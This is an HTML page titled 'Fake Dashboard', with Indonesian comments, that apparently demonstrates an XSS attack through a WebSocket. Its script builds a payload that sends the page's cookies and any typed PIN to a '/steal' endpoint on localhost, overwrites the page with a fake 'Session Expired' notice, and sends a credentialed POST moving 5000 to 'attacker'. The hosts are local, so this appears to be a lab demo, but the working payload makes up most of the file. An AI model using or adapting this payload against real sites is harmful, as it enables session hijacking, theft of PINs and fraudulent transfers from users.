<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Fake Dashboard</title>
</head>
<body>
  <h2>Welcome, user123!</h2>
  <p>Your balance: <b>$5000</b></p>
  <input id="secret" placeholder="Enter your PIN" />
  <script>
    const ws = new WebSocket("ws://localhost:8765");

    // Simulasi eksekusi payload XSS
    ws.onopen = () => {
      const payload = `<script>
        // 1. Kirim cookie
        fetch('http://localhost:8000/steal?cookie=' + document.cookie);

        // 2. Kirim data input (PIN)
        setInterval(() => {
          const val = document.getElementById('secret')?.value;
          if(val) fetch('http://localhost:8000/steal?pin=' + val);
        }, 5000);

        // 3. Ganti tampilan halaman
        document.body.innerHTML = '<h1>Session Expired. Please re-login.</h1>';

        // 4. Kirim request palsu (simulasi transfer uang)
        fetch('/api/transfer', {
          method: 'POST',
          credentials: 'include',
          body: JSON.stringify({ to: 'attacker', amount: 5000 }),
          headers: { 'Content-Type': 'application/json' }
        });
      <\/script>`;
      ws.send(payload);
    };
  </script>
</body>
</html>
